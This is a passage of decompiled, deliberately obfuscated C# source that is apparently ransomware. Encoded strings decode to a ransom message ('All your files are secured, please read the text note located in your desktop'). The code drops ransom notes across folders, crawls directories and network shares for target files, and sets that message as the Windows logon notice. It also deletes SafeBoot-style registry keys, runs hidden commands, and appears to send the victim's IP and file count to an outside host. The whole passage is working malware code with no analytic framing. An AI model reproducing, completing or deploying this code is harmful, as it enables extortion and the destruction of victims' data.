				getString_0(107394917),
				getString_0(107394908),
				getString_0(107394903),
				getString_0(107394930)
			}, new string[0], MXXPCoXZKEzPC, getString_0(107394925));
		}
		catch (Exception ex6)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107394876) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!LoAUTpZIRmiA || AngOozHSWJQ)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851));
					streamWriter.WriteLine(FEZRNsQdHf(getString_0(107394818)).Replace(getString_0(107390408), ATYckHdWsYOYHnae.VVqKyWIMql()).Replace(getString_0(107390367), Environment.UserName).Replace(getString_0(107390382), Environment.MachineName)
						.Replace(getString_0(107390329), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395746));
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter.WriteLine(FEZRNsQdHf(getString_0(107390344)));
						streamWriter.WriteLine(EXVykcHaTCNay);
					}
					if (rmNaxrdaErS == getString_0(107396236))
					{
						streamWriter.WriteLine(getString_0(107395746));
						streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389783)) + Convert.ToString(SNtBTLidlROtoV.Count));
					}
					if (YazilaoopZ)
					{
						streamWriter.WriteLine(getString_0(107395746));
						streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389738)));
						streamWriter.WriteLine(ATYckHdWsYOYHnae.VVqKyWIMql());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851));
					if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851), getString_0(107389705) + EXVykcHaTCNay);
					}
				}
			}
			catch (Exception ex6)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389676) + ex6.Message + getString_0(107395746));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in HMEbcaxMfcYzgl)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107394851)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851), item + getString_0(107394851), overwrite: true);
					}
					else
					{
						string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851));
						if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
						{
							File.AppendAllText(item + getString_0(107394851), getString_0(107389705) + EXVykcHaTCNay);
						}
					}
				}
				catch (Exception ex6)
				{
					if (CCDyMIHlAe)
					{
						try
						{
							File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389676) + ex6.Message + getString_0(107395746));
						}
						catch (Exception)
						{
						}
					}
				}
				if (!ZaxDTmLwAHHZwVkZ && num > 10)
				{
					break;
				}
			}
		}
		if ((cuUuUUMpmxH == getString_0(107396809) && !LoAUTpZIRmiA) || (cuUuUUMpmxH == getString_0(107396809) && AngOozHSWJQ))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389599)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389599));
					streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389566)).Replace(getString_0(107390408), ATYckHdWsYOYHnae.VVqKyWIMql()).Replace(getString_0(107390367), Environment.UserName).Replace(getString_0(107390382), Environment.MachineName)
						.Replace(getString_0(107390329), Environment.UserDomainName));
					streamWriter.WriteLine(getString_0(107395746));
					if (CoyMCdqKPDBfCk || !PAOJgADrbjEa)
					{
						streamWriter.WriteLine(FEZRNsQdHf(DCsyUOPpHm(getString_0(107389581))));
						streamWriter.WriteLine(EXVykcHaTCNay + FEZRNsQdHf(getString_0(107389988)));
					}
					if (rmNaxrdaErS == getString_0(107396236))
					{
						streamWriter.WriteLine(getString_0(107395746));
						streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389975)) + FEZRNsQdHf(getString_0(107389783)) + Convert.ToString(SNtBTLidlROtoV.Count) + FEZRNsQdHf(getString_0(107389988)));
					}
					if (YazilaoopZ)
					{
						streamWriter.WriteLine(getString_0(107395746));
						streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389738)));
						streamWriter.WriteLine(ATYckHdWsYOYHnae.VVqKyWIMql());
					}
				}
				else
				{
					string text7 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851));
					if (!text7.Contains(EXVykcHaTCNay) && !PAOJgADrbjEa)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389599), FEZRNsQdHf(getString_0(107389975)) + getString_0(107389705) + EXVykcHaTCNay + FEZRNsQdHf(getString_0(107389988)));
					}
				}
			}
			catch (Exception ex6)
			{
				if (CCDyMIHlAe)
				{
					try
					{
						File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389914) + ex6.Message + getString_0(107395746));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (OcAolhvchhcmQ == getString_0(107396809))
		{
			try
			{
				if (rmNaxrdaErS == getString_0(107396236))
				{
					ATYckHdWsYOYHnae.TeVCZEIzFBgW(getString_0(107389857), getString_0(107389852), getString_0(107389871), string.Concat(FEZRNsQdHf(getString_0(107395812)), new WebClient().DownloadString(FEZRNsQdHf(getString_0(107395819))), getString_0(107389830), FEZRNsQdHf(getString_0(107395741)), DateTime.Now, getString_0(107395746), FEZRNsQdHf(getString_0(107389825)), Convert.ToString(SNtBTLidlROtoV.Count), getString_0(107395746), FEZRNsQdHf(getString_0(107395732)), EXVykcHaTCNay));
				}
				else
				{
					ATYckHdWsYOYHnae.TeVCZEIzFBgW(getString_0(107389857), getString_0(107389852), getString_0(107389871), string.Concat(FEZRNsQdHf(getString_0(107395812)), new WebClient().DownloadString(FEZRNsQdHf(getString_0(107395819))), getString_0(107389830), FEZRNsQdHf(getString_0(107395741)), DateTime.Now, getString_0(107395746), FEZRNsQdHf(getString_0(107389825)), Convert.ToString(SNtBTLidlROtoV.Count), getString_0(107395746), FEZRNsQdHf(getString_0(107395732)), EXVykcHaTCNay));
				}
			}
			catch
			{
			}
		}
		if (DhKuNmjsjM == getString_0(107396809))
		{
			try
			{
				oPmcFHxEvYNqK.uVEFioCQbgzGpI(new Uri(getString_0(107389296)));
			}
			catch
			{
			}
		}
		if (cuUuUUMpmxH == getString_0(107396236) && !LoAUTpZIRmiA)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851)))
				{
					Process.Start(FEZRNsQdHf(getString_0(107389295)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107394851));
				}
			}
			catch
			{
			}
		}
		else if (cuUuUUMpmxH == getString_0(107396809) && !LoAUTpZIRmiA)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389599)))
				{
					Process.Start(FEZRNsQdHf(getString_0(107389270)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389599));
				}
			}
			catch
			{
			}
		}
		if (CvhuRhPbSX == getString_0(107396809))
		{
			if (bUDblfHLHXAcgkB == getString_0(107396809) && !string.IsNullOrEmpty(vClGBOKLiQn) && !string.IsNullOrEmpty(EiyrcFiAoaX))
			{
				xWuNZDoODJXWn(vClGBOKLiQn, EiyrcFiAoaX);
			}
			else
			{
				xWuNZDoODJXWn(getString_0(107389221), getString_0(107389224));
			}
		}
		if (YwXcfYcDlzL != getString_0(107389078))
		{
			FlGiCidZETDNn(YwXcfYcDlzL);
		}
		if (!string.IsNullOrEmpty(fKcZCslCfAJPz))
		{
			try
			{
				File.Delete(fKcZCslCfAJPz);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396344))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396344)));
			}
		}
		catch (Exception ex11)
		{
			try
			{
				File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389541) + ex11.Message);
			}
			catch (Exception)
			{
			}
		}
		if (CCDyMIHlAe)
		{
			try
			{
				File.AppendAllText(dtHHyJMWMTcTg, getString_0(107389496));
			}
			catch (Exception)
			{
			}
		}
		if (gheRqfduEuJ == getString_0(107389515))
		{
			fbCyLjnfYvogRbL();
		}
	}

	public static void vRUMQRkpIdAEI()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(FEZRNsQdHf(DCsyUOPpHm(getString_0(107389474))), FEZRNsQdHf(getString_0(107389221)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int mRYZIcPInre(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> lGwItrCorKPHD(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((text.Contains(getString_0(107389352)) || text.Contains(getString_0(107389327)) || text.Contains(getString_0(107388782)) || text.ToLower().Contains(getString_0(107388733)) || text.ToLower().Contains(getString_0(107388752)) || text.Contains(getString_0(107388695)) || text.Contains(getString_0(107388674)) || text.ToLower().Contains(getString_0(107388693)) || text.ToLower().Contains(getString_0(107388680)) || text.ToLower().Contains(getString_0(107388611)) || text.ToLower().Contains(getString_0(107388602)) || text.ToLower().Contains(getString_0(107388617)) || text.ToLower().Contains(getString_0(107388572)) || text.ToLower().Contains(getString_0(107388591)) || text.ToLower().Contains(getString_0(107388538))) && !text.Contains(FEZRNsQdHf(getString_0(107389025))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0210;
			}
			catch
			{
			}
			continue;
			IL_0210:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388984)) && !fileInfo.FullName.Contains(getString_0(107388999)) && !fileInfo.FullName.Contains(getString_0(107388982)) && !fileInfo.FullName.Contains(getString_0(107388933)) && !fileInfo.FullName.Contains(getString_0(107388948)) && !fileInfo.FullName.Contains(getString_0(107388899)) && !fileInfo.FullName.Contains(getString_0(107388914)) && !fileInfo.FullName.Contains(getString_0(107388865)) && !fileInfo.FullName.Contains(getString_0(107388884)) && !fileInfo.FullName.Contains(getString_0(107388831)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388850)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388805)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388820)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388259)) && !fileInfo.FullName.Contains(FEZRNsQdHf(getString_0(107388274))) && !fileInfo.FullName.Contains(getString_0(107388217)) && !fileInfo.FullName.Contains(getString_0(107396344)) && !fileInfo.FullName.Contains(getString_0(107388236)) && !fileInfo.FullName.EndsWith(getString_0(107394925)) && !fileInfo.FullName.EndsWith(getString_0(107388211)) && !fileInfo.FullName.EndsWith(getString_0(107388206)) && !fileInfo.FullName.EndsWith(getString_0(107388201)) && !fileInfo.FullName.EndsWith(getString_0(107388164)) && !fileInfo.FullName.Contains(getString_0(107388159)) && !fileInfo.FullName.Contains(RoiBxbbYOpTnzdF) && !fileInfo.FullName.Contains(dtHHyJMWMTcTg) && !fileInfo.FullName.Contains(muQSQoYNOwJp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == getString_0(107396809))
						{
							list.Add(fileInfo.FullName);
							dMMVJNhsRNP(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && HirTGWkSHczrmbY == getString_0(107396236))
						{
							list.Add(fileInfo.FullName);
							dMMVJNhsRNP(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void iGGmDwNsvVDlfp()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388174));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!ZmKssmQIdPi.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388089), getString_0(107397179)).Replace(getString_0(107388116), getString_0(107388089))
					.Replace(getString_0(107388107), getString_0(107389296))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					ZmKssmQIdPi.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388089), getString_0(107397179)).Replace(getString_0(107388116), getString_0(107388089))
						.Replace(getString_0(107388107), getString_0(107389296))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388070), getString_0(107389296)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string cMEEnMgkUxxsbbNh(string CClExZRuvLBv = "", string HyURwdkpYwQbJu = "")
	{
		string result = getString_0(107389296);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CClExZRuvLBv,
				Arguments = HyURwdkpYwQbJu,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void hZnFNfUtYzBkS(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388061),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string DCsyUOPpHm(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string FEZRNsQdHf(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void oatgylPEIWUyM(string tmfmEjrSxBq = "", string mCvXvCoiBJ = "SW5mb3JtYXRpb24uLi4=", string jnXSeTaVRgZM = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		tmfmEjrSxBq = DCsyUOPpHm(getString_0(107388076));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(tmfmEjrSxBq), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(FEZRNsQdHf(getString_0(107388491)), FEZRNsQdHf(mCvXvCoiBJ));
				registryKey.SetValue(FEZRNsQdHf(getString_0(107388458)), FEZRNsQdHf(jnXSeTaVRgZM));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			tmfmEjrSxBq = DCsyUOPpHm(getString_0(107388429));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(tmfmEjrSxBq), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(FEZRNsQdHf(getString_0(107388292)), FEZRNsQdHf(mCvXvCoiBJ));
				registryKey.SetValue(FEZRNsQdHf(getString_0(107387747)), FEZRNsQdHf(jnXSeTaVRgZM));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void RfqaSWCLHLgU()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (bUDblfHLHXAcgkB == getString_0(107396809) && !string.IsNullOrEmpty(vClGBOKLiQn) && !string.IsNullOrEmpty(EiyrcFiAoaX))
				{
					oatgylPEIWUyM(getString_0(107389296), vClGBOKLiQn, EiyrcFiAoaX);
				}
				else
				{
					oatgylPEIWUyM(getString_0(107389296), getString_0(107389221), getString_0(107389224));
				}
			}
		}
		catch
		{
		}
	}

	public static void xWuNZDoODJXWn(string iJyYvJDupAl = "SW5mb3JtYXRpb24uLi4=", string EHKYZCmSccDL = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(FEZRNsQdHf(iJyYvJDupAl));
		val.set_BalloonTipText(FEZRNsQdHf(EHKYZCmSccDL));
		val.ShowBalloonTip(30000);
	}

	public static void FlGiCidZETDNn(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107387718)), getString_0(107387733) + text + getString_0(107387724) + string_0);
	}

	private static void ugWPmBlYRKrC()
	{
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027c: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		pCTrEemjBb();
		List<aQbFQKBRzcpG> list = aQbFQKBRzcpG.zXktJoGFXOazd();
		foreach (aQbFQKBRzcpG item in list)
		{
			YlScjROcYdt.Add(item.IPAddress);
		}
		List<string> ylScjROcYdt = YlScjROcYdt;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a = delegate(string string_0)
			{
				FDWaiaZIHSfYzWE CS_0024_003C_003E8__locals0 = new FDWaiaZIHSfYzWE();
				CS_0024_003C_003E8__locals0.qjrSbwgLWCX = string_0;
				if ((CS_0024_003C_003E8__locals0.qjrSbwgLWCX.StartsWith(getString_0(107385916)) || CS_0024_003C_003E8__locals0.qjrSbwgLWCX.StartsWith(getString_0(107385911)) || CS_0024_003C_003E8__locals0.qjrSbwgLWCX.StartsWith(getString_0(107385934)) || CS_0024_003C_003E8__locals0.qjrSbwgLWCX.StartsWith(getString_0(107385889))) && mrxeSdVVYWXFqpVy.TqzEDIyAXxOW(CS_0024_003C_003E8__locals0.qjrSbwgLWCX))
				{
					try
					{
						Thread.Sleep(GCkorullzoFEFAMeg);
						ZmKssmQIdPi.Add(getString_0(107388089) + CS_0024_003C_003E8__locals0.qjrSbwgLWCX + getString_0(107385880));
						try
						{
							if (fgLeGcGjPkpRXH)
							{
								Console.WriteLine(getString_0(107388089) + CS_0024_003C_003E8__locals0.qjrSbwgLWCX + getString_0(107385880));
							}
						}
						catch
						{
						}
						Parallel.For(68, 91, delegate(int int_0)
						{
							Thread.Sleep(GCkorullzoFEFAMeg);
							ZmKssmQIdPi.Add(FDWaiaZIHSfYzWE.getString_0(107388095) + CS_0024_003C_003E8__locals0.qjrSbwgLWCX + FDWaiaZIHSfYzWE.getString_0(107397185) + (char)int_0 + FDWaiaZIHSfYzWE.getString_0(107401950));
							try
							{
								if (fgLeGcGjPkpRXH)
								{
									Console.WriteLine(FDWaiaZIHSfYzWE.getString_0(107388095) + CS_0024_003C_003E8__locals0.qjrSbwgLWCX + FDWaiaZIHSfYzWE.getString_0(107397185) + (char)int_0 + FDWaiaZIHSfYzWE.getString_0(107401950));
								}
							}
							catch
							{
							}
						});
					}
					catch
					{
					}
				}
			};
		}
		Parallel.ForEach(ylScjROcYdt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a);
		try
		{
			mrxeSdVVYWXFqpVy.MsXudhWZpxx msXudhWZpxx = new mrxeSdVVYWXFqpVy.MsXudhWZpxx(mrxeSdVVYWXFqpVy.bQhnKghiygbx.NCFneKVgxkCN, mrxeSdVVYWXFqpVy.SGTVLqXglXqgx.AwWxvhzWZKNcglUa, mrxeSdVVYWXFqpVy.GHgfFOrcsxyL.lrFvahbkHdXN, mrxeSdVVYWXFqpVy.QVAITefzvZKQM.kDcmsCXhdYR);
			foreach (string item2 in msXudhWZpxx)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107387719));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!ZmKssmQIdPi.Contains(item3.ToString()))
						{
							ZmKssmQIdPi.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (fgLeGcGjPkpRXH)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		mlGGaljMxqYWb.DJYVsPOdSl();
		try
		{
			if (fgLeGcGjPkpRXH)
			{
				Console.WriteLine(getString_0(107387638));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = DCsyUOPpHm(getString_0(107388429));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(FEZRNsQdHf(getString_0(107387597)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(FEZRNsQdHf(getString_0(107387540)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (XoculucrhuBC == getString_0(107396809))
		{
			XInkCOSArzi.TRPsSqqynF();
		}
		try
		{
			if (fgLeGcGjPkpRXH)
			{
				Console.WriteLine(getString_0(107388007));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388174));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (ZmKssmQIdPi.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388089), getString_0(107397179)).Replace(getString_0(107388116), getString_0(107388089))
					.Replace(getString_0(107388107), getString_0(107389296))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (fgLeGcGjPkpRXH)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388089), getString_0(107397179)).Replace(getString_0(107388116), getString_0(107388089))
							.Replace(getString_0(107388107), getString_0(107389296))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388070), getString_0(107389296)));
					}
				}
				catch
				{
				}
				ZmKssmQIdPi.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388089), getString_0(107397179)).Replace(getString_0(107388116), getString_0(107388089))
					.Replace(getString_0(107388107), getString_0(107389296))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388070), getString_0(107389296)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (fgLeGcGjPkpRXH)
			{
				Console.WriteLine(getString_0(107387950));
			}
		}
		catch
		{
		}
	}

	public static bool JypwwxJDpxfD()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107387881));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void mfHpUWwIqhik(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = FEZRNsQdHf(getString_0(107387848));
		processStartInfo.Arguments = getString_0(107387819) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool FdvYSFIGyAUutM(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool vrnRKRhJqCfK(string string_0)
	{
		try
		{
			gvRAKexsehIhc CS_0024_003C_003E8__locals0 = new gvRAKexsehIhc();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.nvRebewysN = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.nvRebewysN);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107387782);
		}
		catch
		{
			return false;
		}
	}

	public static void QipSEJSigIFVZ()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = DCsyUOPpHm(getString_0(107387773));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387155)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387098)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387113)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387088)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387848)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387031)));
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387718)));
					registryKey.Close();
				}
				string_ = DCsyUOPpHm(getString_0(107387002));
				registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387417)));
					registryKey.Close();
				}
				string_ = DCsyUOPpHm(getString_0(107387432));
				registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387417)));
					registryKey.Close();
				}
				string_ = DCsyUOPpHm(getString_0(107387432));
				registryKey = Registry.CurrentUser.OpenSubKey(FEZRNsQdHf(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(FEZRNsQdHf(getString_0(107387417)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107387383)), FEZRNsQdHf(getString_0(107387366)));
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107387349)), FEZRNsQdHf(DCsyUOPpHm(getString_0(107387340))));
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107387349)), FEZRNsQdHf(getString_0(107386650)));
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107386589)), FEZRNsQdHf(getString_0(107386604)));
		}
		catch
		{
		}
	}

	public static void QXCLEGXnLYcbL(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(FEZRNsQdHf(getString_0(107386499)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void yefBXsphkSGl()
	{
		string string_ = DCsyUOPpHm(getString_0(107386506));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(FEZRNsQdHf(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(FEZRNsQdHf(getString_0(107386905)), 1, RegistryValueKind.DWord);
